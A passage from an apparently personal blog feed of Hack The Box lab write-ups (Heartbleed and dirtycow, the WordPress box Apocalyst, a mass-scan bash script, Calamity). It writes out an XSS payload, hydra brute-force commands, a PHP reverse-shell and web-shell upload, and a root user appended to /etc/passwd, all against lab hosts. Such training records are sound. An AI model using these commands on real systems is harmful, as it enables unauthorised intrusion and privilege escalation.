do:<br><br><span class="hljs-number">1</span>) Coffee.<br><span class="hljs-number">2</span>) Research.<br><span class="hljs-number">3</span>) Fix decoder/encoder before going live.<br><span class="hljs-number">4</span>) Make sure encoding/decoding <span class="hljs-keyword">is</span> only done client-<span class="hljs-literal">side</span>.<br><span class="hljs-number">5</span>) Don<span class="hljs-symbol">&#x27;t</span> <span class="hljs-keyword">use</span> the decoder/encoder <span class="hljs-keyword">until</span> any <span class="hljs-keyword">of</span> this <span class="hljs-keyword">is</span> done.<br><span class="hljs-number">6</span>) Find a better way <span class="hljs-keyword">to</span> take notes.<br></code></pre></div></td></tr></table></figure><p><a href="https://10.10.10.79/encode">https://10.10.10.79/encode</a><br>输入<code>2222&lt;/br&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p><p> 一个反射性xss</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-22-04/6.PNG" alt="6"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-22-04/7.PNG" alt="7"></p><p>Secure Data Encoder - No Data is Stored On Our Servers ，看起来不像注入漏洞。没有利用思路了，看看writeup</p><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-22-04/8.PNG" alt="8"></p><p>google hex to ascii码，得到了一个ssh私钥。我的内心是这样的凸(艹皿艹 )</p><p>htb总是将密码口令以不引人注目的方式藏在诸如ftp服务器上，实际上在real场景中，几乎没有人会这么做。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-22-04/9.PNG" alt="9"></p><p>chmod 400 id_rsa</p><p>ssh -i id_rsa <a href="mailto:&#104;&#x79;&#x70;&#101;&#x40;&#49;&#48;&#46;&#x31;&#x30;&#x2e;&#49;&#x30;&#x2e;&#x37;&#57;">&#104;&#x79;&#x70;&#101;&#x40;&#49;&#48;&#46;&#x31;&#x30;&#x2e;&#49;&#x30;&#x2e;&#x37;&#57;</a></p><p>需要输入密码</p><hr><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">searchsploit heartbleed<br><span class="hljs-keyword">python</span> <span class="hljs-number">32745</span>.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">p</span> <span class="hljs-number">443</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.79</span><br>换一个poc<br><br>wget http<span class="hljs-variable">s:</span>//raw.githubusercontent.<span class="hljs-keyword">com</span>/sensepost/heartbleed-poc/master/heartbleed-poc.<span class="hljs-keyword">py</span><br><span class="hljs-keyword">python</span> heartbleed-poc.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">p</span> <span class="hljs-number">443</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.79</span><br><span class="hljs-keyword">python</span> heartbleed-poc.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">p</span> <span class="hljs-number">443</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.79</span> -n <span class="hljs-number">10</span> &gt; memori.txt<br></code></pre></div></td></tr></table></figure><p>通过heardbleed泄露内存中的信息，但是试了一百多（-n选择次数），也没有成功dump出text包含的ssh密码。好坑~~</p><p>总之，heartbleedbelievethehype，以该口令ssh成功登入。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>cat /etc/passwd</p><p>发现有一个用户firefart，立即意识到，有人用dirtycow成功提权了</p><p>于是查找exp</p><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">find / -name <span class="hljs-string">&quot;dirty&quot;</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br><br>看到tmp目录有现成的<br>./dirty <span class="hljs-number">123</span><br>等待一分钟左右<br><br>su firefart<br><span class="hljs-number">123</span><br></code></pre></div></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>heartbleed是一种内存错误，发生在443端口，ssl协议</p><p>tmux是指通过一个终端登录远程主机并运行后，在其中可以开启多个控制台的终端复用软件。</p><p>利用权限错误，以root权限运行tmux，可以利用该软件提权。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apocalyst（CTF-like）</title>
    <link href="/2019/03/21/06-x/"/>
    <url>/2019/03/21/06-x/</url>
    
    <content type="html"><![CDATA[<figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2.<span class="hljs-number">2</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| ssh-<span class="hljs-symbol">hostkey:</span> <br>|   <span class="hljs-number">2048</span> <span class="hljs-symbol">fd:</span><span class="hljs-symbol">ab:</span>0<span class="hljs-symbol">f:</span><span class="hljs-symbol">c9:</span><span class="hljs-number">22</span><span class="hljs-symbol">:d5</span><span class="hljs-symbol">:f4</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">f:</span><span class="hljs-number">7</span><span class="hljs-symbol">a:</span>0<span class="hljs-symbol">a:</span><span class="hljs-number">29</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:b4</span><span class="hljs-symbol">:</span>04<span class="hljs-symbol">:da</span><span class="hljs-symbol">:c9</span> (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">76</span><span class="hljs-symbol">:</span><span class="hljs-number">92</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span>0<span class="hljs-symbol">a:</span><span class="hljs-number">57</span><span class="hljs-symbol">:bd</span><span class="hljs-symbol">:f0</span><span class="hljs-symbol">:</span>03<span class="hljs-symbol">:</span><span class="hljs-number">26</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:c7</span><span class="hljs-symbol">:db</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">a:</span><span class="hljs-number">66</span><span class="hljs-symbol">:a5</span><span class="hljs-symbol">:bc</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">12</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:cf</span><span class="hljs-symbol">:f1</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">f:</span><span class="hljs-symbol">be:</span><span class="hljs-number">43</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">f:</span><span class="hljs-symbol">d5:</span><span class="hljs-symbol">e6:</span><span class="hljs-number">6</span><span class="hljs-symbol">d:</span><span class="hljs-number">90</span><span class="hljs-symbol">:</span><span class="hljs-number">84</span><span class="hljs-symbol">:</span><span class="hljs-number">25</span><span class="hljs-symbol">:c8</span><span class="hljs-symbol">:bd</span> (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> ((Ubuntu))<br>|_http-<span class="hljs-symbol">generator:</span> WordPress <span class="hljs-number">4.8</span><br>|_http-server-<span class="hljs-symbol">header:</span> Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> (Ubuntu)<br>|_http-<span class="hljs-symbol">title:</span> Apocalypse Preparation Blog<br>Service <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">OS:</span> Linux; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span class="hljs-symbol">linux:</span>linux_kernel<br></code></pre></div></td></tr></table></figure><ul><li>访问发现很慢</li><li><code>wget http://10.10.10.46 </code>，发现一个域名</li><li><code>echo 10.10.10.46 apocalyst.htb &gt;&gt; /etc/hosts</code></li><li>访问<code>http://apocalyst.htb</code></li></ul><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">wpscan</span> <span class="hljs-string">--url</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.46</span> <span class="hljs-string">--enumerate</span><br><span class="hljs-attr">Scan Aborted:</span> <span class="hljs-string">Unable</span> <span class="hljs-string">to</span> <span class="hljs-string">identify</span> <span class="hljs-string">the</span> <span class="hljs-string">wp-content</span> <span class="hljs-string">dir,</span> <span class="hljs-string">please</span> <span class="hljs-string">supply</span> <span class="hljs-string">it</span> <span class="hljs-string">with</span> <span class="hljs-string">--wp-content-dir</span><br><span class="hljs-string">于是用域名作为地址扫描</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">wpscan</span> <span class="hljs-string">--url</span> <span class="hljs-string">apocalyst.htb</span> <span class="hljs-string">--enumerate</span><br>[<span class="hljs-type">!]</span> <span class="hljs-attr">27 vulnerabilities identified:</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">wpscan</span> <span class="hljs-string">--url</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.46</span> <span class="hljs-string">--enumerate</span> <span class="hljs-string">p</span> <span class="hljs-string">--enumerate</span> <span class="hljs-string">u</span><br><span class="hljs-string">wpscan</span> <span class="hljs-string">--url</span> <span class="hljs-string">http://apocalyst.htb/</span> <span class="hljs-string">--plugins-detection</span> <span class="hljs-string">aggressive</span><br><span class="hljs-string">gobuster</span> <span class="hljs-string">-u</span> <span class="hljs-string">http://10.10.10.46</span> <span class="hljs-string">-w</span> <span class="hljs-string">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">searchsploit</span> <span class="hljs-string">wordpress</span> <span class="hljs-string">twentyseventeen</span><br></code></pre></div></td></tr></table></figure><h2 id="info"><a href="#info" class="headerlink" title="info"></a>info</h2><p>WordPress version 4.8<br><a href="http://apocalyst.htb/wp-login.php">http://apocalyst.htb/wp-login.php</a><br>用户名：falaraki<br>没有发现任何插件</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span><br><br>hydra -l falaraki -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span><span class="hljs-number">500</span>-worst-passwords.txt -f apocalyst.htb http-post-form <span class="hljs-string">&quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&amp;testcookie=1:ERROR&quot;</span><br><br>hydra -l falaraki -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span><span class="hljs-number">500</span>-worst-passwords.txt <span class="hljs-number">10.10</span>.<span class="hljs-number">10.46</span> ssh<br><br>hydra -l falaraki -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span><span class="hljs-number">3000</span>-pass.txt -f apocalyst.htb http-post-form <span class="hljs-string">&quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&amp;testcookie=1:ERROR&quot;</span><br>弱密码未发现<br><br>wpscan --url http:<span class="hljs-regexp">//</span>apocalyst.htb<span class="hljs-regexp">/wp-login.php --wordlist /u</span>sr<span class="hljs-regexp">/share/</span>wordlists/<span class="hljs-number">500</span>-worst-passwords.txt --username falaraki<br>失败<br></code></pre></div></td></tr></table></figure><p>CVE-2019-8942:需要一个author用户，才能远程代码执行</p><h2 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h2><ul><li>目录遍历：</li></ul><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>apocalyst.htb<span class="hljs-regexp">/wp-content/u</span>ploads<span class="hljs-regexp">/2017/</span><span class="hljs-number">07</span>/<br>http:<span class="hljs-regexp">//</span>apocalyst.htb<span class="hljs-regexp">/wp-content/u</span>pgrade/<br></code></pre></div></td></tr></table></figure><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-21-06/1.PNG" alt="1"></p><p>steghide extract -sf image.jpg</p><p>扫描web时候，发现很多网页301跳转到一张图片。通过隐藏术，提取一个list.txt，然后暴力破解就得到口令登陆web后台。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wpscan --url http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.46</span> --wordlist <span class="hljs-regexp">/root/</span>Desktop<span class="hljs-regexp">/46/</span>wordlist.txt --username falaraki<br>wpscan版本更新后，不支持--wordlist参数了，顺便提一句，我讨厌暴力破解<br><br>hydra -l falaraki -P <span class="hljs-regexp">/root/</span>Desktop<span class="hljs-regexp">/46/</span>wordlist.txt -f apocalyst.htb http-post-form <span class="hljs-string">&quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&amp;testcookie=1:ERROR&quot;</span><br></code></pre></div></td></tr></table></figure><p>falaraki/Transclisiation</p><p>appearance-editor-修改404.php为php-reverse-shell.php，然后访问一个不存在的页面<br><code>apocalyst.htb/?p=9999</code></p><p>get webshell:  www-data</p><hr><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">/usr/bin/python3.<span class="hljs-number">5</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><br><span class="hljs-built_in">ls</span> <span class="hljs-literal">-al</span> /etc/passwd<br>发现可读可写权限<br><br>openssl生成密文<br>openssl passwd <span class="hljs-literal">-help</span><br>openssl passwd <span class="hljs-literal">-1</span> <span class="hljs-literal">-salt</span> ippsec hackthebox<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ippsec:\<span class="hljs-variable">$1</span>\<span class="hljs-variable">$ippsec</span>\<span class="hljs-variable">$bO</span>.JNJVLhnoduioFs74jX1:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd<br><br>注意<span class="hljs-variable">$</span>字符需要\转义，否则不会写入passwd文件<br><br>su ippsec<br>hackthebox<br></code></pre></div></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以后遇到ctf-like的靶机都绕着走。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-21-06/2.PNG" alt="2"></p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shell-script（二）</title>
    <link href="/2019/03/21/08-x/"/>
    <url>/2019/03/21/08-x/</url>
    
    <content type="html"><![CDATA[<p>案例三：写一个bash script，目的是扫描40台主机的全部端口，服务版本，生成以IP为目录的扫描结果。</p><p><strong>扫描网段内在线主机</strong></p><figure class="highlight diff"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs diff">nmap -sn 10.10.10.0/24 -oA 123<br><span class="hljs-deletion">-oN 生成nmap类型扫描结果</span><br><span class="hljs-deletion">-oX</span><br><span class="hljs-deletion">-oG</span><br></code></pre></div></td></tr></table></figure><p>生成gnmap、nmap、xml类型扫描结果，查看后gnmap比较适合解析。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">nmap -sn <span class="hljs-number">10.10</span>.<span class="hljs-number">10.0</span>/<span class="hljs-number">24</span> -oG <span class="hljs-number">12</span><br><br>awk <span class="hljs-string">&#x27;NR&gt;1 &#123; print $2&#125;&#x27;</span> <span class="hljs-number">12</span> &gt; IP-out.txt<br>sed -i <span class="hljs-string">&#x27;$d&#x27;</span> IP-out.txt<br><span class="hljs-comment">#获得了在线主机列表IP-out.txt</span><br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> $(cat IP-out.txt) <span class="hljs-comment">#依次迭代txt的每一行</span><br><span class="hljs-keyword">do</span> <br>mkdir <span class="hljs-regexp">/root/</span>Desktop/<span class="hljs-variable">$line</span><br>    masscan -p1-<span class="hljs-number">65535</span>,U:<span class="hljs-number">1</span>-<span class="hljs-number">65535</span> --rate=<span class="hljs-number">1000</span> -e tun0 <span class="hljs-variable">$line</span> &gt; <span class="hljs-regexp">/root/</span>Desktop<span class="hljs-regexp">/$line/</span>ports.txt<br>done<br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> $(cat IP-out.txt) <span class="hljs-comment">#依次迭代txt的每一行</span><br><span class="hljs-keyword">do</span><br><br>    ports=$(cat <span class="hljs-regexp">/root/</span>Desktop<span class="hljs-regexp">/$line/</span>ports.txt | awk -F <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&#x27;&#123;print $4&#125;&#x27;</span> | awk -F <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | sort -n | tr <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span> | sed <span class="hljs-string">&#x27;s/,$//&#x27;</span>)<br>    nmap -Pn -sV -sC -p<span class="hljs-variable">$ports</span> <span class="hljs-variable">$&#123;line&#125;</span> -oN nmap-result<br>done<br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> $(cat IP-out.txt) <span class="hljs-comment">#如果web端口开放，则扫描目录</span><br><span class="hljs-keyword">do</span><br>    cd <span class="hljs-regexp">/root/</span>Desktop/<span class="hljs-variable">$line</span><br>    <span class="hljs-keyword">if</span> grep <span class="hljs-number">80</span>/tcp ports.txt;then<br>    wget http:<span class="hljs-regexp">//</span><span class="hljs-variable">$&#123;line&#125;</span><br>        gobuster -u http:<span class="hljs-regexp">//</span><span class="hljs-variable">$&#123;line&#125;</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium.txt &gt; gobuster-out.txt<br>    fi<br>done<br><br></code></pre></div></td></tr></table></figure><h2 id="最终版本"><a href="#最终版本" class="headerlink" title="最终版本"></a>最终版本</h2><p><a href="https://raw.githubusercontent.com/Whale3070/ctf-coding/master/range-scan.sh">https://raw.githubusercontent.com/Whale3070/ctf-coding/master/range-scan.sh</a></p><p>2019年7月，hackthebox改版，该脚本只能批量扫描在线靶机，不能扫描退休靶机了。</p><p>执行效果：<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-21/11.PNG" alt="4"></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Calamity（web rce）</title>
    <link href="/2019/03/21/x/"/>
    <url>/2019/03/21/x/</url>
    
    <content type="html"><![CDATA[<figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2.<span class="hljs-number">2</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| ssh-<span class="hljs-symbol">hostkey:</span> <br>|   <span class="hljs-number">2048</span> <span class="hljs-symbol">b6:</span><span class="hljs-number">46</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">c:</span><span class="hljs-symbol">b5:</span><span class="hljs-number">71</span><span class="hljs-symbol">:c5</span><span class="hljs-symbol">:</span><span class="hljs-number">96</span><span class="hljs-symbol">:</span><span class="hljs-number">91</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">d:</span><span class="hljs-symbol">e4:</span><span class="hljs-number">63</span><span class="hljs-symbol">:</span><span class="hljs-number">16</span><span class="hljs-symbol">:f9</span><span class="hljs-symbol">:</span><span class="hljs-number">59</span><span class="hljs-symbol">:a2</span> (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">10</span><span class="hljs-symbol">:c4</span><span class="hljs-symbol">:</span>09<span class="hljs-symbol">:b9</span><span class="hljs-symbol">:</span><span class="hljs-number">48</span><span class="hljs-symbol">:f1</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">c:</span><span class="hljs-number">45</span><span class="hljs-symbol">:</span><span class="hljs-number">26</span><span class="hljs-symbol">:ca</span><span class="hljs-symbol">:f6</span><span class="hljs-symbol">:e1</span><span class="hljs-symbol">:c2</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:</span><span class="hljs-number">36</span><span class="hljs-symbol">:b9</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-symbol">a8:</span><span class="hljs-symbol">bf:</span><span class="hljs-symbol">dd:</span><span class="hljs-symbol">c0:</span><span class="hljs-number">71</span><span class="hljs-symbol">:</span><span class="hljs-number">36</span><span class="hljs-symbol">:a8</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">a:</span><span class="hljs-number">1</span><span class="hljs-symbol">b:</span><span class="hljs-symbol">ea:</span><span class="hljs-number">3</span><span class="hljs-symbol">f:</span><span class="hljs-symbol">ef:</span><span class="hljs-number">66</span><span class="hljs-symbol">:</span><span class="hljs-number">99</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">75</span> (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> ((Ubuntu))<br>|_http-server-<span class="hljs-symbol">header:</span> Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> (Ubuntu)<br>|_http-<span class="hljs-symbol">title:</span> Brotherhood Software<br>Service <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">OS:</span> Linux; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span class="hljs-symbol">linux:</span>linux_kernel<br></code></pre></div></td></tr></table></figure><h2 id="web-scan"><a href="#web-scan" class="headerlink" title="web scan"></a>web scan</h2><figure class="highlight php-template"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php-template"><span class="xml">gobuster -u http://10.10.10.27 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="xml">/uploads (Status: 301)</span><br><span class="xml"></span><br><span class="xml">---</span><br><span class="xml">curl -X OPTIONS http://10.10.10.27 -I</span><br><span class="xml">HTTP/1.1 200 OK</span><br><span class="xml">Date: Wed, 20 Mar 2019 02:36:59 GMT</span><br><span class="xml">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="xml">Allow: OPTIONS,GET,HEAD,POST</span><br><span class="xml">Content-Length: 0</span><br><span class="xml">Content-Type: text/html</span><br><span class="xml">---</span><br><span class="xml">curl -X PUT http://10.10.10.27/uploads/1.html -d &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span></span><span class="xml">&quot; <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>405 Method Not Allowed<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Method Not Allowed<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>The requested method PUT is not allowed for the URL /uploads/1.html.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">address</span>&gt;</span>Apache/2.4.18 (Ubuntu) Server at 10.10.10.27 Port 80<span class="hljs-tag">&lt;/<span class="hljs-name">address</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml">---</span><br><span class="xml">nikto -h 10.10.10.27 </span><br><span class="xml"></span><br><span class="xml"></span><br><span class="xml">+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST </span><br><span class="xml">+ OSVDB-29786: /admin.php?en_log_id=0&amp;action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.</span><br><span class="xml">+ OSVDB-29786: 